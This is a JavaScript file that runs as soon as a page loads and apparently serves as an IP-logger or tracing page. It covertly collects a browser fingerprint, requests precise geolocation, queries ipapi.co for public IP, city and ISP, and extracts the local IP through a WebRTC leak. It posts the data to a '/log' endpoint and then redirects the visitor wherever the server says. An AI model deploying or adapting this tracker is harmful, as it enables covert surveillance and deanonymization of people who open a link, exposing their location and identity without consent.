

function HttpGETRequest(url) {
    return new Promise((resolve, reject) => {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.onload = function () {
            if (xhr.status === 200) {
                resolve(xhr.responseText);
            } else {
                reject(new Error("Request failed with status code: " + xhr.status));
            }
        };
        xhr.onerror = function () {
            reject(new Error("Request failed"));
        };
        xhr.send(null);
    });
    
}

async function HarvestSystemInformation() {
    return {
        UserAgent: navigator.userAgent,
        CPUCount: navigator.hardwareConcurrency != null ? navigator.hardwareConcurrency : 'Unknown',
        Screen: {
            Width: window.screen.availWidth != null ? window.screen.availWidth : 'Unknown',
            Height: window.screen.availHeight != null ? window.screen.availHeight : 'Unknown',
            Depth: screen.pixelDepth != null ? screen.pixelDepth : 'Unknown',
        },
        Battery: await async function() {
            try {
                return navigator.getBattery().then(function(battery) {
                    return battery.level * 100 + '%';
                });
            } catch (error) {
                console.error('Battery query failed: ' + error);
                return 'Unknown';
            }
        }(),
        RAM: navigator.deviceMemory != null ? navigator.deviceMemory + 'GB' : 'Unknown',
        TouchPoints: navigator.maxTouchPoints != null ? navigator.maxTouchPoints : 'Unknown',
        Render: function (){
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const extension = gl.getExtension('WEBGL_debug_renderer_info');
                return gl ? gl.getParameter(extension.UNMASKED_RENDERER_WEBGL) : null;
            } catch (e) { 
                console.error('Render query failed: ' + e);
                return 'Unknown';
            }
        }(),
        Devices: await async function(){
            try {
                return navigator.mediaDevices.enumerateDevices().then(detected_devices => {
                    return Array.prototype.map.call(detected_devices, (d) => d.kind);
                });
            } catch (error) {
                console.error('Devices query failed: ' + error);
                return [];
            }
        }(),
        Geolocation: await async function() {
            result = { Latitude: 'Unknown', Longitude: 'Unknown', Message: 'Geolocation request was denied!'};
            function getPosition() {
                return new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
            }
            async function parseLocation() {
                try {
                    const position = await getPosition();
                    result = { Latitude: position.coords.latitude, Longitude: position.coords.longitude };
                } catch (error) {
                    console.error('Geo query failed: ' + error);
                    return {};
                }
            }
            await parseLocation();
            return result;
        }(),
        IPInfo: await async function() {
            try {
                let response = await HttpGETRequest('https://ipapi.co/json/');
                let json = JSON.parse(response);
                return { Latitude: json['latitude'], Longitude: json['longitude'], Country: json['country_name'], CountryCode: json['country_code'], City: json['city'], IP: json['ip'], ISP: json['org'] };
            } catch (error) {
                console.error('IP query failed: ' + error);
                return { status: 'failed' };
            }
            
        }(),
        LocalIP: await async function() {
            return await new Promise(function(resolve, reject) {
                try {
                    // NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
                    let RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
            
                    if(!RTCPeerConnection) {
                        resolve('API error');
                    }
            
                    let rtc = new RTCPeerConnection({
                        iceServers: []
                    });
                    let addrs = {};
                    addrs["0.0.0.0"] = false;
            
                    function grepSDP(sdp) {
                        let finalIP = '';
                        sdp.split('\r\n').forEach(function(line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
                            if(~line.indexOf("a=candidate")) { // http://tools.ietf.org/html/rfc4566#section-5.13
                                let parts = line.split(' '), // http://tools.ietf.org/html/rfc5245#section-15.1
                                    addr = parts[4],
                                    type = parts[7];
                                if(type === 'host') {
                                    finalIP = addr;
                                }
                            } else if(~line.indexOf("c=")) { // http://tools.ietf.org/html/rfc4566#section-5.7
                                let parts = line.split(' '),
                                    addr = parts[2];
                                finalIP = addr;
                            }
                        });
                        return finalIP;
                    }
            
                    if(1 || window.mozRTCPeerConnection) { // FF [and now Chrome!] needs a channel/stream to proceed
                        rtc.createDataChannel('', {
                            reliable: false
                        });
                    };
            
                    rtc.onicecandidate = function(evt) {
                        // convert the candidate to SDP so we can run it through our general parser
                        // see https://twitter.com/lancestout/status/525796175425720320 for details
                        if(evt.candidate) {
                            let addr = grepSDP("a=" + evt.candidate.candidate);
                            resolve(addr);
                        }
                    };
                    rtc.createOffer(function(offerDesc) {
                        rtc.setLocalDescription(offerDesc);
                    }, function(e) {
                        console.warn("offer failed", e);
                    });
                } catch (error) {
                    console.error('Local IP query failed: ' + error);
                    resolve('Error');
                }
            }).then((ip) => {
                return ip;
            });
        }(),
        Language: navigator.language || navigator.userLanguage || navigator.browserLanguage || navigator.systemLanguage,
        Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        Plugins: function() {
            try {
                return Array.prototype.map.call(navigator.plugins, (p) => p.name);
            }catch (error) {
                console.error('Plugins query failed: ' + error);
                return [];
            }
        }(),
        SpeechVoices: await async function() {
            try {
                return await new Promise(function(resolve, reject) {
                    if ('speechSynthesis' in window) {
                        window.speechSynthesis.onvoiceschanged = function() {
                            let voices = window.speechSynthesis.getVoices();
                            voices = Array.prototype.map.call(voices, (v) => v.lang);
                            resolve(voices);
                        };
                        setTimeout(window.speechSynthesis.onvoiceschanged, 50);
                    }
                });
            } catch { }
            return [];
        }(),
        FeatureSupport: {
            LocalStorage: !!window.localStorage,
            SessionStorage: !!window.sessionStorage,
            IndexedDb: !!window.indexedDB,
            Cookies: navigator.cookieEnabled,
            Java: window.navigator.javaEnabled && window.navigator.javaEnabled(),
            AdBlocker: function() {
                let isAdBlockerDetected = false;
                try {
                    // Create a bait div element
                    let testAd = document.createElement('div');
                    testAd.innerHTML = '&nbsp;';
                    testAd.className = 'adsbox';
                    document.body.appendChild(testAd);
                    // Record the current time
                    let startTime = Date.now();
                    let checkDuration = 100;  // 100 ms
                    // Busy-wait loop
                    while (true) {
                        // Check if the ad was hidden
                        isAdBlockerDetected = testAd.offsetHeight === 0;
                        // Check if the check duration has passed
                        if (Date.now() - startTime > checkDuration) {
                            break;
                        }
                    }
                    // Clean up
                    document.body.removeChild(testAd);
                } catch {}
                return isAdBlockerDetected;
            }(),
        },
        Url: window.location.href,
        CurrentTimestamp: new Date().toLocaleString(),
        UnixTimestamp: Date.now()
    }
};

function SendReport(data) {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "/log", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);
                if (response['redirect'].length > 0) {
                    window.location.href = response['redirect'];
                }
            } else {
                alert("Request failed with status: " + xhr.status);
            }
        }
    };
    xhr.send(JSON.stringify(data));
}

async function beginTrace() {
    let data = await HarvestSystemInformation();
    console.log(data);
    SendReport(data);
}


window.addEventListener("load", (e) => {
    beginTrace();
});